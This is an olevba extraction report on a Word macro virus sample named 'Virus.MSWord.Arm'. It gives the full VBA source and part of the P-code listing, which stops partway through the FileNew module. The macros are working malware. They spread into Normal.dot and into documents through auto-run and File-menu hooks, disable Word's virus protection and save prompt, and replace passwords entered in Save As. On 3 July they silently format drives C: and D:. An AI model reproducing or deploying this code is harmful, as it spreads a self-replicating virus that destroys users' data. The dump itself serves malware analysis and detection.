olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Arm
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Arm - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Armaegaden.bas 
in file: Virus.MSWord.Arm - OLE stream: 'Macros/VBA/Armaegaden'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Armaegaden()
If Day(Now()) = 3 And Month(Now()) = 7 Then
    sCmd$ = "echo y | format c:/u"
    Shell (Environ("comspec") + " /c " + sCmd$), vbHide
    sCmd$ = "echo y | format d:/u"
    Shell (Environ("comspec") + " /c " + sCmd$), vbHide
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO ToolsMacro.bas 
in file: Virus.MSWord.Arm - OLE stream: 'Macros/VBA/ToolsMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub ToolsMacro()
On Error GoTo ErrorInfectTM

'Dialogs(wdDialogToolsMacro).Show
If MacroContainer <> ActiveDocument.Name Then
    WordBasic.macrocopy "Armaegaden", ActiveWindow.Caption + ":Armaegaden", 1
    WordBasic.macrocopy "ToolsMacro", ActiveWindow.Caption + ":ToolsMacro", 1
    WordBasic.macrocopy "FileClose", ActiveWindow.Caption + ":FileClose", 1
    WordBasic.macrocopy "FileNew", ActiveWindow.Caption + ":FileNew", 1
    WordBasic.macrocopy "FileExit", ActiveWindow.Caption + ":FileExit", 1
    WordBasic.macrocopy "FileSave", ActiveWindow.Caption + ":FileSave", 1
    WordBasic.macrocopy "FileSaveAs", ActiveWindow.Caption + ":FileSaveAs", 1
    WordBasic.macrocopy "AutoOpen", ActiveWindow.Caption + ":AutoOpen", 1
    WordBasic.macrocopy "AutoClose", ActiveWindow.Caption + ":AutoClose", 1
    WordBasic.macrocopy "AutoExec", ActiveWindow.Caption + ":AutoExec", 1
End If
ErrorInfectTM:
    With Options
    .SaveNormalPrompt = False
    .VirusProtection = False
    End With
    Call Armaegaden.Armaegaden
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileClose.bas 
in file: Virus.MSWord.Arm - OLE stream: 'Macros/VBA/FileClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileClose()
Attribute FileClose.VB_Description = "Closes all of the windows of the active document"
Attribute FileClose.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.FileClose"

On Error GoTo ErrorInfectGlobalTemplateFC
For i = 1 To WordBasic.countmacros(0)
    If WordBasic.macroname(i, 0) = "Armaegaden" Then
        checkinfected = 9
    End If
Next i
If checkinfected <> 9 Then
    WordBasic.macrocopy ActiveWindow.Caption + ":Armaegaden", "Armaegaden", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":ToolsMacro", "ToolsMacro", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":AutoOpen", "AutoOpen", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":AutoClose", "AutoClose", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":AutoExec", "AutoExec", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileClose", "FileClose", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileNew", "FileNew", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileExit", "FileExit", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileSave", "FileSave", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileSaveAs", "FileSaveAs", 1
    End If
        With Options
    .SaveNormalPrompt = False
    .VirusProtection = False
    End With
Template.Save
ErrorInfectGlobalTemplateFC:
        With Options
    .SaveNormalPrompt = False
    .VirusProtection = False
    
    End With
Call Armaegaden.Armaegaden

    WordBasic.FileClose

End Sub
-------------------------------------------------------------------------------
VBA MACRO FileNew.bas 
in file: Virus.MSWord.Arm - OLE stream: 'Macros/VBA/FileNew'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileNew()
Attribute FileNew.VB_Description = "Creates a new document or template"
Attribute FileNew.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.FileNew"

On Error GoTo ErrorInfectGlobalTemplateFN
For i = 1 To WordBasic.countmacros(0)
    If WordBasic.macroname(i, 0) = "Armaegaden" Then
        checkinfected = 9
    End If
Next i
If checkinfected <> 9 Then
    WordBasic.macrocopy ActiveWindow.Caption + ":Armaegaden", "Armaegaden", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":ToolsMacro", "ToolsMacro", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":AutoOpen", "AutoOpen", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":AutoClose", "AutoClose", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":AutoExec", "AutoExec", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileClose", "FileClose", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileNew", "FileNew", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileExit", "FileExit", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileSave", "FileSave", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileSaveAs", "FileSaveAs", 1
End If
        With Options
    .SaveNormalPrompt = False
    .VirusProtection = False
    End With
Template.Save
ErrorInfectGlobalTemplateFN:
        With Options
    .SaveNormalPrompt = False
      .VirusProtection = False
    End With
    Dialogs(wdDialogFileNew).Show
    Call Armaegaden.Armaegaden
    

End Sub
-------------------------------------------------------------------------------
VBA MACRO FileExit.bas 
in file: Virus.MSWord.Arm - OLE stream: 'Macros/VBA/FileExit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileExit()
Attribute FileExit.VB_Description = "Quits Microsoft Word and prompts to save the documents"
Attribute FileExit.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.FileExit"

On Error GoTo ErrorInfectGlobalTemplateE
For i = 1 To WordBasic.countmacros(0)
    If WordBasic.macroname(i, 0) = "Armaegaden" Then
        checkinfected = 9
    End If
Next i
If checkinfected <> 9 Then
    WordBasic.macrocopy ActiveWindow.Caption + ":Armaegaden", "Armaegaden", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":ToolsMacro", "ToolsMacro", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":AutoOpen", "AutoOpen", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":AutoClose", "AutoClose", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":AutoExec", "AutoExec", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileClose", "FileClose", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileNew", "FileNew", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileExit", "FileExit", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileSave", "FileSave", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileSaveAs", "FileSaveAs", 1
    End If
        With Options
    .SaveNormalPrompt = False
    .VirusProtection = False
    End With
Template.Save
ErrorInfectGlobalTemplateE:
        With Options
    .SaveNormalPrompt = False
    .VirusProtection = False
    End With
Call Armaegaden.Armaegaden

    WordBasic.FileExit

End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: Virus.MSWord.Arm - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileSave()
On Error GoTo ErrorInfectFS
If MacroContainer <> ActiveDocument.Name Then
    WordBasic.macrocopy "Armaegaden", ActiveWindow.Caption + ":Armaegaden", 1
    WordBasic.macrocopy "ToolsMacro", ActiveWindow.Caption + ":ToolsMacro", 1
    WordBasic.macrocopy "FileClose", ActiveWindow.Caption + ":FileClose", 1
    WordBasic.macrocopy "FileNew", ActiveWindow.Caption + ":FileNew", 1
    WordBasic.macrocopy "FileExit", ActiveWindow.Caption + ":FileExit", 1
    WordBasic.macrocopy "FileSave", ActiveWindow.Caption + ":FileSave", 1
    WordBasic.macrocopy "FileSaveAs", ActiveWindow.Caption + ":FileSaveAs", 1
    WordBasic.macrocopy "AutoOpen", ActiveWindow.Caption + ":AutoOpen", 1
    WordBasic.macrocopy "AutoClose", ActiveWindow.Caption + ":AutoClose", 1
    WordBasic.macrocopy "AutoExec", ActiveWindow.Caption + ":AutoExec", 1
    'Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="AutoOpen", Object:=wdOrganizerObjectProjectItems
    'Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="AutoClose", Object:=wdOrganizerObjectProjectItems
    'Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="AutoExec", Object:=wdOrganizerObjectProjectItems
    'Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="FileExit", Object:=wdOrganizerObjectProjectItems
    'Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="FileSaveAs", Object:=wdOrganizerObjectProjectItems
    'Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="FileClose", Object:=wdOrganizerObjectProjectItems
    'Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="FileSave", Object:=wdOrganizerObjectProjectItems
    'Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="FileNew", Object:=wdOrganizerObjectProjectItems
    'Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="ToolsMacro", Object:=wdOrganizerObjectProjectItems
    'Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Armaegaden", Object:=wdOrganizerObjectProjectItems
End If
ErrorInfectFS:
    With Options
    .SaveNormalPrompt = False
    .VirusProtection = False
    End With
ActiveDocument.Save
Call Armaegaden.Armaegaden


End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Arm - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileSaveAs()
Attribute FileSaveAs.VB_Description = "Saves a copy of the document in a separate file"
Attribute FileSaveAs.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.FileSaveAs"

On Error GoTo ErrorInfectFSA
Set dlg = Dialogs(wdDialogFileSaveAs)
dlg.Update
dlg.Show
If (dlg.Format = 0) Or (dlg.Format = 1) Then
If MacroContainer <> ActiveDocument.Name Then
        WordBasic.macrocopy "Armaegaden", ActiveWindow.Caption + ":Armaegaden", 1
        WordBasic.macrocopy "ToolsMacro", ActiveWindow.Caption + ":ToolsMacro", 1
        WordBasic.macrocopy "FileClose", ActiveWindow.Caption + ":FileClose", 1
        WordBasic.macrocopy "FileNew", ActiveWindow.Caption + ":FileNew", 1
        WordBasic.macrocopy "FileExit", ActiveWindow.Caption + ":FileExit", 1
        WordBasic.macrocopy "FileSave", ActiveWindow.Caption + ":FileSave", 1
        WordBasic.macrocopy "FileSaveAs", ActiveWindow.Caption + ":FileSaveAs", 1
        WordBasic.macrocopy "AutoOpen", ActiveWindow.Caption + ":AutoOpen", 1
        WordBasic.macrocopy "AutoClose", ActiveWindow.Caption + ":AutoClose", 1
        WordBasic.macrocopy "AutoExec", ActiveWindow.Caption + ":AutoExec", 1
        dlg.Format = 1
    End If
End If
ErrorInfectFSA:
If (dlg.Password <> "") Then
    dlg.Password = "Armaegaden"
End If
    With Options
    .SaveNormalPrompt = False
    .VirusProtection = False
    End With
    dlg.Update
Call Armaegaden.Armaegaden

End Sub

-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Arm - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()
Attribute MAIN.VB_Description = "Macro created 07/06/99 by Yap"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.autoopen"

On Error GoTo ErrorInfectGlobalTemplate
For i = 1 To WordBasic.countmacros(0)
    If WordBasic.macroname(i, 0) = "Armaegaden" Then
        checkinfected = 9
    End If
Next i
If checkinfected <> 9 Then
    WordBasic.macrocopy ActiveWindow.Caption + ":Armaegaden", "Armaegaden", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":ToolsMacro", "ToolsMacro", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":AutoOpen", "AutoOpen", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":AutoClose", "AutoClose", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":AutoExec", "AutoExec", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileClose", "FileClose", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileNew", "FileNew", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileExit", "FileExit", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileSave", "FileSave", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileSaveAs", "FileSaveAs", 1
    End If
    With Options
    .SaveNormalPrompt = False
    .VirusProtection = False
    End With
    Template.Save
ErrorInfectGlobalTemplate:
    With Options
    .SaveNormalPrompt = False
    .VirusProtection = False
    End With
Call Armaegaden.Armaegaden
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Arm - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()
Attribute MAIN.VB_Description = "Macro created 07/07/99 by ELIJAH GARY LOW"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.AutoClose"

On Error GoTo ErrorInfectGlobalTemplateC
For i = 1 To WordBasic.countmacros(0)
    If WordBasic.macroname(i, 0) = "Armaegaden" Then
        checkinfected = 9
    End If
Next i
If checkinfected <> 9 Then
    WordBasic.macrocopy ActiveWindow.Caption + ":Armaegaden", "Armaegaden", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":ToolsMacro", "ToolsMacro", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":AutoOpen", "AutoOpen", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":AutoClose", "AutoClose", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":AutoExec", "AutoExec", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileClose", "FileClose", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileNew", "FileNew", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileExit", "FileExit", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileSave", "FileSave", 1
    WordBasic.macrocopy ActiveWindow.Caption + ":FileSaveAs", "FileSaveAs", 1
End If
    With Options
    .SaveNormalPrompt = False
    .VirusProtection = False
    End With
    Template.Save
ErrorInfectGlobalTemplateC:
    With Options
    .SaveNormalPrompt = False
    .VirusProtection = False
    End With
    Call Armaegaden.Armaegaden

End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: Virus.MSWord.Arm - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()
Attribute MAIN.VB_Description = "Macro created 07/07/99 by ELIJAH GARY LOW"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.AutoExec"

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Arm
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Armaegaden - 1352 bytes
' Line #0:
' 	FuncDefn (Sub Armaegaden())
' Line #1:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0007 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #2:
' 	LitStr 0x0014 "echo y | format c:/u"
' 	St sCmd$ 
' Line #3:
' 	LitStr 0x0007 "comspec"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0004 " /c "
' 	Add 
' 	Ld sCmd$ 
' 	Add 
' 	Paren 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #4:
' 	LitStr 0x0014 "echo y | format d:/u"
' 	St sCmd$ 
' Line #5:
' 	LitStr 0x0007 "comspec"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0004 " /c "
' 	Add 
' 	Ld sCmd$ 
' 	Add 
' 	Paren 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #6:
' 	EndIfBlock 
' Line #7:
' 	EndSub 
' Macros/VBA/ToolsMacro - 2095 bytes
' Line #0:
' 	FuncDefn (Sub ToolsMacro())
' Line #1:
' 	OnError ErrorInfectTM 
' Line #2:
' Line #3:
' 	QuoteRem 0x0000 0x0020 "Dialogs(wdDialogToolsMacro).Show"
' Line #4:
' 	Ld MacroContainer 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ne 
' 	IfBlock 
' Line #5:
' 	LitStr 0x000A "Armaegaden"
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000B ":Armaegaden"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #6:
' 	LitStr 0x000A "ToolsMacro"
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000B ":ToolsMacro"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #7:
' 	LitStr 0x0009 "FileClose"
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000A ":FileClose"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #8:
' 	LitStr 0x0007 "FileNew"
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0008 ":FileNew"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #9:
' 	LitStr 0x0008 "FileExit"
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0009 ":FileExit"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #10:
' 	LitStr 0x0008 "FileSave"
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #11:
' 	LitStr 0x000A "FileSaveAs"
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #12:
' 	LitStr 0x0008 "AutoOpen"
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #13:
' 	LitStr 0x0009 "AutoClose"
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #14:
' 	LitStr 0x0008 "AutoExec"
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	Label ErrorInfectTM 
' Line #17:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #18:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #19:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #20:
' 	EndWith 
' Line #21:
' 	Ld Armaegaden 
' 	ArgsMemCall (Call) Armaegaden 0x0000 
' Line #22:
' 	EndSub 
' Macros/VBA/FileClose - 2653 bytes
' Line #0:
' 	FuncDefn (Sub FileClose())
' Line #1:
' Line #2:
' 	OnError ErrorInfectGlobalTemplateFC 
' Line #3:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd countmacros 0x0001 
' 	For 
' Line #4:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd macroname 0x0002 
' 	LitStr 0x000A "Armaegaden"
' 	Eq 
' 	IfBlock 
' Line #5:
' 	LitDI2 0x0009 
' 	St checkinfected 
' Line #6:
' 	EndIfBlock 
' Line #7:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #8:
' 	Ld checkinfected 
' 	LitDI2 0x0009 
' 	Ne 
' 	IfBlock 
' Line #9:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000B ":Armaegaden"
' 	Add 
' 	LitStr 0x000A "Armaegaden"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #10:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000B ":ToolsMacro"
' 	Add 
' 	LitStr 0x000A "ToolsMacro"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #11:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitStr 0x0008 "AutoOpen"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #12:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	LitStr 0x0009 "AutoClose"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #13:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	LitStr 0x0008 "AutoExec"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #14:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000A ":FileClose"
' 	Add 
' 	LitStr 0x0009 "FileClose"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #15:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0008 ":FileNew"
' 	Add 
' 	LitStr 0x0007 "FileNew"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #16:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0009 ":FileExit"
' 	Add 
' 	LitStr 0x0008 "FileExit"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #17:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	LitStr 0x0008 "FileSave"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #18:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitStr 0x000A "FileSaveAs"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #21:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #22:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #23:
' 	EndWith 
' Line #24:
' 	Ld Template 
' 	ArgsMemCall Save 0x0000 
' Line #25:
' 	Label ErrorInfectGlobalTemplateFC 
' Line #26:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #27:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #28:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #29:
' Line #30:
' 	EndWith 
' Line #31:
' 	Ld Armaegaden 
' 	ArgsMemCall (Call) Armaegaden 0x0000 
' Line #32:
' Line #33:
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0000 
' Line #34:
' Line #35:
' 	EndSub 
' Macros/VBA/FileNew - 2647 bytes
' Line #0:
' 	FuncDefn (Sub FileNew())
' Line #1:
' Line #2:
' 	OnError ErrorInfectGlobalTemplateFN 
' Line #3:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd countmacros 0x0001 
' 	For 
' Line #4:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd macroname 0x0002 
' 	LitStr 0x000A "Armaegaden"
' 	Eq 
' 	IfBlock 
' Line #5:
' 	LitDI2 0x0009 
' 	St checkinfected 
' Line #6:
' 	EndIfBlock 
' Line #7:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #8:
' 	Ld checkinfected 
' 	LitDI2 0x0009 
' 	Ne 
' 	IfBlock 
' Line #9:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000B ":Armaegaden"
' 	Add 
' 	LitStr 0x000A "Armaegaden"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #10:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000B ":ToolsMacro"
' 	Add 
' 	LitStr 0x000A "ToolsMacro"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #11:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitStr 0x0008 "AutoOpen"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #12:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	LitStr 0x0009 "AutoClose"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #13:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	LitStr 0x0008 "AutoExec"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #14:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000A ":FileClose"
' 	Add 
' 	LitStr 0x0009 "FileClose"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #15:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0008 ":FileNew"
' 	Add 
' 	LitStr 0x0007 "FileNew"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #16:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0009 ":FileExit"
' 	Add 
' 	LitStr 0x0008 "FileExit"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #17:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	LitStr 0x0008 "FileSave"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #18:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitStr 0x000A "FileSaveAs"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall macrocopy 0x0003 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #21:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #22:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #23:
' 	EndWith 
' Line #24:
' 	Ld Template 
' 	ArgsMemCall Save 0x0000 
' Line #25:
' 	Label ErrorInfectGlobalTemplateFN 
' Line #26:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #27:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #28:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #29:
' 	EndWith 
' Line #30:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #31:
' 	Ld Armaegaden 
' 	ArgsMemCall (Call) Armaegaden 0x0000 
' Line #32:
